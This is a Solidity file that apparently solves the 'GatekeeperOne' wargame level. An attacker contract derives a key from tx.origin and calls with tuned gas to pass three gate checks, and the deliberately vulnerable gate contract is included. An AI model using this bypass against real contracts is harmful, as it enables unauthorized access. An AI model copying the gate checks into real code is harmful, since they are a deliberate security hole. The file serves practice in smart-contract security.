// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
contract hack{
    function enter(address _target,uint gas) external {
        GatekeeperOne target =GatekeeperOne(_target);
        uint k16 = uint16(uint160(tx.origin));
        uint64 k64 = uint64(1 << 63)+ uint64(k16);
        bytes8 key = bytes8(k64);
        target.enter{gas:8191*10 + gas}(key);


    }
}
contract GatekeeperOne {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        require(gasleft() % 8191 == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}